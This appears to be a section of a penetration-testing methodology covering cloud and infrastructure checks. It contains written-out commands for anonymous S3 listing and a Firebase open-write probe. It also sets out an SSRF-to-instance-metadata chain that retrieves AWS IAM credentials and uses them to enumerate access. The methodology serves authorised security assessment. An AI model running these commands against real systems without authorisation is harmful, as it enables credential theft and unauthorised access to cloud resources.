## 3M. Cloud & Infrastructure (if in scope)
*CRUXSS-CLD-IAM-01 through -04 | CRUXSS-CLD-COMP-01 through -05 | CRUXSS-CLD-NET-01 through -04 | CRUXSS-CLD-ATK-01 through -03*

```bash
# IAM policy review (CRUXSS-CLD-IAM-01) — requires cloud credentials
# prowler aws --region us-east-1 | tee session/prowler.txt
# scoutsuite --provider aws | tee session/scoutsuite.txt

# IMDS testing via SSRF (CRUXSS-CLD-COMP-01) — covered in 3F above

# S3 public access (CRUXSS-CLD-NET-02)
aws s3 ls s3://TARGET-BUCKET --no-sign-request 2>/dev/null
# If data returns → public read → Critical

# Firebase open write check (CRUXSS-CLD-RCON-01)
curl -s -X PUT "https://TARGET.firebaseio.com/test.json" -d '"pwned"'
# If success → open write → Critical

# Security group overly permissive ports (CRUXSS-CLD-COMP-03)
# prowler aws --check ec2_security_group_wide_open_to_internet
```

### Cloud Credential → Privilege Escalation Chain (CRUXSS-CLD-ATK-01, CRUXSS-CLD-IAM-02)
```
1. SSRF → IMDS (CRUXSS-CLD-COMP-01)
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
2. Get role name, then:
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
   → AccessKeyId + SecretAccessKey + Token
3. Use keys:
   AWS_ACCESS_KEY_ID=X AWS_SECRET_ACCESS_KEY=Y aws sts get-caller-identity
4. Enumerate what the role can access (CRUXSS-CLD-IAM-01)
   AWS_ACCESS_KEY_ID=X ... aws s3 ls
   AWS_ACCESS_KEY_ID=X ... aws iam list-attached-role-policies --role-name ROLE
```

---

